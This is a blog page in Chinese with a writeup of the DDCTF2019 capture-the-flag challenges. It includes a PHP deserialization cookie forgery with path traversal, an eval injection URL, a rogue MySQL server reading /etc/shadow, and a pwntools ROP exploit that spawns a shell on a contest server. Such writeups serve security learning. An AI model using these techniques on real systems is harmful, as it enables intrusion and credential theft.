@@ -1,0 +1,626 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.ico">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico">
+  <link rel="mask-icon" href="/images/favicon.ico" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"rmb122.com","root":"/","scheme":"Mist","version":"8.0.0-rc.2","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":"flat"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="历时 N 天, 滴滴终于审完了 Writeup, 终于可以发 wp 了, 我从 33 名到 16 名, 太真实了…部分题目质量还是不错的 _(:з」∠)_, 因为要交上去, 所以就没截图了, 凑合看吧 (逃">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DDCTF2019 Writeup">
+<meta property="og:url" content="https://rmb122.com/2019/04/25/DDCTF2019-Writeup/index.html">
+<meta property="og:site_name" content="Rmb122&#39;s Notebook">
+<meta property="og:description" content="历时 N 天, 滴滴终于审完了 Writeup, 终于可以发 wp 了, 我从 33 名到 16 名, 太真实了…部分题目质量还是不错的 _(:з」∠)_, 因为要交上去, 所以就没截图了, 凑合看吧 (逃">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2019-04-24T16:17:49.000Z">
+<meta property="article:modified_time" content="2019-07-22T01:47:16.142Z">
+<meta property="article:author" content="rmb122">
+<meta property="article:tag" content="writeup">
+<meta property="article:tag" content="ddctf">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://rmb122.com/2019/04/25/DDCTF2019-Writeup/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>DDCTF2019 Writeup | Rmb122's Notebook</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="Rmb122's Notebook" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+        <span class="toggle-line toggle-line-first"></span>
+        <span class="toggle-line toggle-line-middle"></span>
+        <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Rmb122's Notebook</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://rmb122.com/2019/04/25/DDCTF2019-Writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="rmb122">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Rmb122's Notebook">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          DDCTF2019 Writeup
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-04-25 00:17:49" itemprop="dateCreated datePublished" datetime="2019-04-25T00:17:49+08:00">2019-04-25</time>
+            </span>
+
+          
+            <span id="/2019/04/25/DDCTF2019-Writeup/" class="post-meta-item leancloud_visitors" data-flag-title="DDCTF2019 Writeup" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2019/04/25/DDCTF2019-Writeup/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2019/04/25/DDCTF2019-Writeup/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>历时 N 天, 滴滴终于审完了 Writeup, 终于可以发 wp 了, 我从 33 名到 16 名, 太真实了…<br>部分题目质量还是不错的 _(:з」∠)_, 因为要交上去, 所以就没截图了, 凑合看吧 (逃  </p>
+<a id="more"></a>
+
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="滴"><a href="#滴" class="headerlink" title="滴~"></a>滴~</h2><p><code>http://117.51.150.246/index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09</code> 中 <code>TmpZMlF6WXhOamN5UlRaQk56QTJOdz09</code><br>可以看出来是双层 base64 + 一层 base16, 解码得到 flag.jpg, 那么可以得到 index.php 就是 <code>TmprMlJUWTBOalUzT0RKRk56QTJPRGN3</code>,<br>就可以直接读源码了, 然而并没有 flag, 也不能读 config.php,<br>跟着注释中的网址 <code>https://blog.csdn.net/FengBanLiuYun/article/details/80616607</code> 可以在同作者底下找到 vim 学习记录, 找到 <code>.practice.txt.swp</code> 但是直接访问 404…,<br>各种姿势尝试发现是 <code>practice.txt.swp</code>… 有毒, 得到 <code>f1ag!ddctf.php</code> 的提示, 用 <code>f1agconfigddctf.php</code> 绕过, 得到源码,<br>用 <code>f1ag!ddctf.php?k=data:,123&amp;uid=123</code> 即可绕过, 得到 flag.</p>
+<h2 id="WEB-签到题"><a href="#WEB-签到题" class="headerlink" title="WEB 签到题"></a>WEB 签到题</h2><p>在 <code>/js/index.js</code> 找到验证逻辑, 通过 <code>didictf_username</code> 的 <code>header</code> 来验证, 随便试了个 <code>admin</code> 就通过了,<br>得到下一步地址 <code>/app/fL2XID2i0Cdh.php</code>,  </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"nickname"</span>])) &#123;</span><br><span class="line">    $arr = <span class="keyword">array</span>($_POST[<span class="string">"nickname"</span>],<span class="keyword">$this</span>-&gt;eancrykey);</span><br><span class="line">    $data = <span class="string">"Welcome my friend %s"</span>;</span><br><span class="line">    <span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">        $data = sprintf($data,$v);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">parent</span>::response($data,<span class="string">"Welcome"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>让 nickname 为 %s 就可以拿到 key, 通过双写绕过替换. 然后构造 Cookie 反序列化就可以了, 脚本如下  </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line"><span class="comment">// ... 省略</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Application();</span><br><span class="line">$a-&gt;path = <span class="string">"..././config/flag.txt"</span>;</span><br><span class="line">$s = serialize($a);</span><br><span class="line">$key = <span class="string">"EzblrbNS"</span>;</span><br><span class="line">$s .= md5($key . $s);</span><br><span class="line"><span class="keyword">echo</span> $s; <span class="comment">// O:11:"Application":1:&#123;s:4:"path";s:21:"..././config/flag.txt";&#125;5a014dbe49334e6dbb7326046950bee2</span></span><br></pre></td></tr></table></figure>
+<p>把 <code>ddctf_id</code> 的值改成这个访问下就拿到 flag 了.</p>
+<h2 id="Upload-IMG"><a href="#Upload-IMG" class="headerlink" title="Upload-IMG"></a>Upload-IMG</h2><p>目的很明确, 图片里面存在 <code>phpinfo()</code> 就给 flag随便传个图片, 下载下来发现有 <code>CREATOR: gd-jpeg</code>,<br>应该是在服务器端有二次处理, 不能通过 exif 啥的携带数据, 用 GIMP 创建一张 20x20 图片, 在本地测试了一下  </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$img = imagecreatefromjpeg(<span class="string">'/home/rmb122/gd.jpg'</span>);</span><br><span class="line">imagejpeg($img, <span class="string">'/home/rmb122/gd-out.jpg'</span>, <span class="number">80</span>);</span><br></pre></td></tr></table></figure>
+<p>010editor 可以解析格式, fuzz 发现在 ScanData 第三个字节后面写 phpinfo() 不会被处理掉, 传上去就拿到 flag 了.  </p>
+<h2 id="homebrew-event-loop"><a href="#homebrew-event-loop" class="headerlink" title="homebrew event loop"></a>homebrew event loop</h2><p>审计源码, 发现  </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">is_action = event[<span class="number">0</span>] == <span class="string">'a'</span> </span><br><span class="line">action = get_mid_str(event, <span class="string">':'</span>, <span class="string">';'</span>) </span><br><span class="line">args = get_mid_str(event, action+<span class="string">';'</span>).split(<span class="string">'#'</span>) </span><br><span class="line"><span class="keyword">try</span>: </span><br><span class="line">    event_handler = eval(action + (<span class="string">'_handler'</span> <span class="keyword">if</span> is_action <span class="keyword">else</span> <span class="string">'_function'</span>)) </span><br><span class="line">    ret_val = event_handler(args) </span><br><span class="line"><span class="keyword">except</span> RollBackException:</span><br></pre></td></tr></table></figure>
+<p>取 event_handler 的时候没有过滤, 通过 <code>?action:funcname%23;...</code><br>也就是在名字后面加个 <code>#</code> 可以绕过必须有后缀的限制, 于是就可以构造<br><code>?action:trigger_event%23;action:buy;1000%23action:get_flag;1</code><br>就可以调用 <code>get_flag_handler</code> 了, 虽然不能直接得到 flag, 而且交易会回滚, 但是因为  </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger_event</span><span class="params">(event)</span>:</span> </span><br><span class="line">    session[<span class="string">'log'</span>].append(event) </span><br><span class="line">    <span class="keyword">if</span> len(session[<span class="string">'log'</span>]) &gt; <span class="number">5</span>: session[<span class="string">'log'</span>] = session[<span class="string">'log'</span>][<span class="number">-5</span>:] </span><br><span class="line">    <span class="keyword">if</span> type(event) == type([]):</span><br></pre></td></tr></table></figure>
+<p>有 log 的原因, 而且会存在 session 里面, 而 flask 的 session 内的数据是存在 cookie 里面的,<br>通过 <a href="https://github.com/noraj/flask-session-cookie-manager" target="_blank" rel="noopener">session_cookie_manager</a> 直接就可以解码, 得到在 log 里面的 flag.</p>
+<h2 id="大吉大利-今晚吃鸡"><a href="#大吉大利-今晚吃鸡" class="headerlink" title="大吉大利,今晚吃鸡~"></a>大吉大利,今晚吃鸡~</h2><p>通过浏览器插件 <code>wappalyzer</code> (应该是分析 Cookie 名称 <code>revel_session</code> 获取的) 可以得到后端是 go 写的,<br>盲猜有整数溢出, 最后试出来 <code>2 ** 32</code> 也就是 <code>4294967296</code> 可以溢出买到票, 里面比较迷,<br>还以为得什么洞拿到机器人的 token, 结果我自己又注册了个号, 发现可以直接自己移除自己…<br>然后写脚本不停自己移除自己就行了, 然后后端分配 id 还是在一个范围内随机的, 不是每次都是新 id, 而且访问速度还有限制<br>后面才能好久移除一个 233, 总之跑了好久移除完访问 <code>/index.html#/main/result</code> 直接拿到 flag.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">act = <span class="string">'rmb122'</span></span><br><span class="line">pwd = <span class="string">'rmb122sudo ufw status numbered'</span></span><br><span class="line">mainSess = requests.session()</span><br><span class="line">mainSess.get(<span class="string">f'http://117.51.147.155:5050/ctf/api/login?name=<span class="subst">&#123;act&#125;</span>&amp;password=<span class="subst">&#123;pwd&#125;</span>'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">999</span>):</span><br><span class="line">    tmpact = <span class="string">'laioqoLKJHSLJDKHKJrmb122'</span> + <span class="string">'QAQ'</span> + str(i)</span><br><span class="line">    tmppwd = <span class="string">'zxczxczxczxcczx'</span></span><br><span class="line">    tmp = requests.session()</span><br><span class="line">    tmp.get(<span class="string">f'http://117.51.147.155:5050/ctf/api/register?name=<span class="subst">&#123;tmpact&#125;</span>&amp;password=<span class="subst">&#123;tmppwd&#125;</span>'</span>)</span><br><span class="line">    tmp.get(<span class="string">'http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967296'</span>)</span><br><span class="line">    bill = tmp.get(<span class="string">'http://117.51.147.155:5050/ctf/api/search_bill_info'</span>).json()[<span class="string">'data'</span>][<span class="number">0</span>][<span class="string">'bill_id'</span>]</span><br><span class="line">    tmp.get(<span class="string">f'http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id=<span class="subst">&#123;bill&#125;</span>'</span>)</span><br><span class="line">    res = tmp.get(<span class="string">'http://117.51.147.155:5050/ctf/api/search_ticket'</span>).json()</span><br><span class="line">    id = res[<span class="string">'data'</span>][<span class="number">0</span>][<span class="string">'id'</span>]</span><br><span class="line">    token = res[<span class="string">'data'</span>][<span class="number">0</span>][<span class="string">'ticket'</span>]</span><br><span class="line">    res = mainSess.get(<span class="string">f'http://117.51.147.155:5050/ctf/api/remove_robot?id=<span class="subst">&#123;id&#125;</span>&amp;ticket=<span class="subst">&#123;token&#125;</span>'</span>).json()</span><br><span class="line">    print(res)</span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="mysql弱口令"><a href="#mysql弱口令" class="headerlink" title="mysql弱口令"></a>mysql弱口令</h2><p>既然是客户端连服务端, 可以想到是 mysql 客户端的文件读取漏洞, 有现成的<a href="https://github.com/allyshka/Rogue-MySql-Server" target="_blank" rel="noopener">项目</a><br>然后一开始没发现 <code>agent.py</code> 里面是用的 <code>netstat</code>, 我用普通用户权限跑过不了检测 233, 就先去做上面一题了,<br>之后看了下源码用 <code>root</code> 跑就没问题了, 成功读 <code>/etc/passwd</code>, 接下来直接尝试读 <code>/etc/shadow</code>, 竟然读的了, 应该是 root 权限跑的 bot,<br>然后读 <code>/root/.bash_history</code> 可以得到 bot 源码路径, 发现提示 <code># flag in mysql  curl@localhost database:security  table:flag</code>,<br>那么直接读数据库文件就可以了, <code>/var/lib/mysql/security/flag.ibd</code>, 拿到 flag.</p>
+<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="Windows-Reverse1"><a href="#Windows-Reverse1" class="headerlink" title="Windows Reverse1"></a>Windows Reverse1</h2><p><code>upx -d</code> 直接脱壳, 但是不知道为什么跑不了 233, 最后还是用的 <code>ida</code> 动态调试原程序, 发现就是对输入的字符替换一下, 写个脚本就行  </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sbox = <span class="string">'''~&#125;|&#123;zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&gt;=&lt;;:9876543210/.-,+*)(\x27&amp;%$#"! '''</span></span><br><span class="line">shift = <span class="number">32</span></span><br><span class="line">revSbox = &#123;&#125;</span><br><span class="line">flag = <span class="string">"DDCTF&#123;reverseME&#125;"</span></span><br><span class="line"><span class="keyword">for</span> seq, i <span class="keyword">in</span> enumerate(sbox):</span><br><span class="line">    revSbox[i] = chr(<span class="number">32</span> + seq)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    print(revSbox[i], end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="Windows-Reverse2"><a href="#Windows-Reverse2" class="headerlink" title="Windows Reverse2"></a>Windows Reverse2</h2><p>用了没听说过的壳, 于是就手动找 OEP 脱了, 然而也跑不了, 只能 F5 233, 不过这也足够了, 发现第一层<br>就是 hex2bin, 然后第二层用了 std::string, 看不出来是啥, 动态调发现其实就是个 base64encode, 结果是 <code>reverse+</code> 就通过<br>那么同样一个脚本搞定  </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">flag = <span class="string">'reverse+'</span></span><br><span class="line">flag = base64.b64decode(flag)</span><br><span class="line">flag = base64.b16encode(flag)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+
+<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="真-签到题"><a href="#真-签到题" class="headerlink" title="真-签到题"></a>真-签到题</h2><p>公告最底下就是啦</p>
+<h2 id="北京地铁"><a href="#北京地铁" class="headerlink" title="北京地铁"></a>北京地铁</h2><p>不得不说这题脑洞是真的大… <code>Stegsolve.jar</code> 可以直接提取出隐写的东西, 但是不知道有啥用…<br>最后提示三放出来以后, 谷歌搜图搜到原图, 发现把二号线的颜色给换了, <code>号</code> 和 <code>线</code> 字周围的颜色不一致就是没 PS 好,<br>233, 然后找了半天差别, 发现 <code>魏公村</code> 的颜色跟别的站点不一样, 随便试了一下拼音发现竟然就是秘钥, 惊了…<br>爆破了半天没出来, 没想到秘钥居然是这个.  </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_lowercase</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">padding</span><span class="params">(key)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> key + <span class="string">b'\x00'</span> * (<span class="number">16</span> - len(key) % <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># for i in product(*([ascii_lowercase] * count)):</span></span><br><span class="line"><span class="comment"># for count in range(1, 17):</span></span><br><span class="line">i = <span class="string">'weigongcun'</span></span><br><span class="line">c = <span class="string">"iKk/Ju3vu4wOnssdIaUSrg=="</span></span><br><span class="line">c = base64.b64decode(c)</span><br><span class="line">a = AES.new(padding(i.encode()), AES.MODE_ECB)</span><br><span class="line">res = a.decrypt(c)</span><br><span class="line"><span class="keyword">if</span> res[:<span class="number">2</span>] == <span class="string">b"DDCTF"</span>:</span><br><span class="line">        print(i)</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>
+
+<h2 id="MulTzor"><a href="#MulTzor" class="headerlink" title="MulTzor"></a>MulTzor</h2><p>感觉是 xor, 随手丢到之前看<a href="https://ctftime.org/writeup/3656" target="_blank" rel="noopener">老外</a>做题发现的<a href="https://github.com/nccgroup/featherduster" target="_blank" rel="noopener">工具</a>,<br>autopwn 一下直接就出 flag 了, 不得不说太强了. </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[+] Running multi-byte XOR brute force attack...</span><br><span class="line"></span><br><span class="line">Best candidate decryptions for M�fjc�ab~Z[�2e...:</span><br><span class="line">----------------------------------------</span><br><span class="line"></span><br><span class="line">Trying keysize 24</span><br><span class="line">Processing chunk 24 of 78</span><br><span class="line">Trying keysize 18</span><br><span class="line">Processing chunk 42 of 78</span><br><span class="line">Trying keysize 36</span><br><span class="line">Processing chunk 78 of 78</span><br><span class="line"></span><br><span class="line">....省略</span><br><span class="line"></span><br><span class="line">The flag is: DDCTF&#123;07b1b46d1db28843d1fd76889fea9b36&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="PWN-strike"><a href="#PWN-strike" class="headerlink" title="[PWN] strike"></a>[PWN] strike</h2><p>read 不会在读取的数据后面加 \x00, 于是就可以通过 fprintf 泄露 setbuf 地址,<br>然后算出基地址. password 长度输 -1, 就可以绕过长度限制, 直接栈溢出, 之后就是 rop 了.  </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'116.85.48.105'</span>,<span class="number">5005</span>)</span><br><span class="line">p.recvuntil(<span class="string">'username:'</span>)</span><br><span class="line">p.send(<span class="string">'1'</span>* <span class="number">40</span>)</span><br><span class="line"></span><br><span class="line">t = p.recvuntil(<span class="string">'Plea'</span>)</span><br><span class="line">libcleak = u32(t[<span class="number">0x33</span>:<span class="number">0x37</span>])  </span><br><span class="line">stackButtom =  u32(t[<span class="number">0x2f</span>:<span class="number">0x33</span>])</span><br><span class="line">stack = stackButtom + <span class="number">0x18</span></span><br><span class="line">libcbase = libcleak - <span class="number">0x00065465</span></span><br><span class="line"><span class="comment"># print hex(stack)</span></span><br><span class="line"><span class="comment"># print hex(libcbase)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'password:'</span>)</span><br><span class="line">p.sendline(<span class="string">'-1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'):'</span>)</span><br><span class="line">binsh = libcbase + <span class="number">0x0015902B</span></span><br><span class="line"><span class="comment"># execve = libcbase + 0x000AF590</span></span><br><span class="line">system = libcbase + <span class="number">0x0003A940</span></span><br><span class="line">payload = p32(stack)*((<span class="number">0x4c</span>+<span class="number">0x18</span>)/<span class="number">4</span> - <span class="number">1</span>) + p32(system) + p32(binsh) *<span class="number">4</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h2><p>找 HTTP 流量, 可以找到几张图, 有一张图损坏无法打开, 发现 crc 不对, 修复一下就是秘钥,<br>得到 <code>57pmYyWt</code>, 然而不知道是啥隐写, 最后通过流量记录发现访问过 <code>http://tools.jb51.net/</code>,<br>可以在上面找到一个图片隐写, 把图片都试了一下最后发现那张比较大的图片可以解出 flag,  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag+AHs-44444354467B5145576F6B63704865556F32574F6642494E37706F6749577346303469526A747D+AH0-</span><br></pre></td></tr></table></figure>
+<p>把里面的 <code>44444354467B5145576F6B63704865556F32574F6642494E37706F6749577346303469526A747D</code>, 解个 hex 就拿到 flag.  </p>
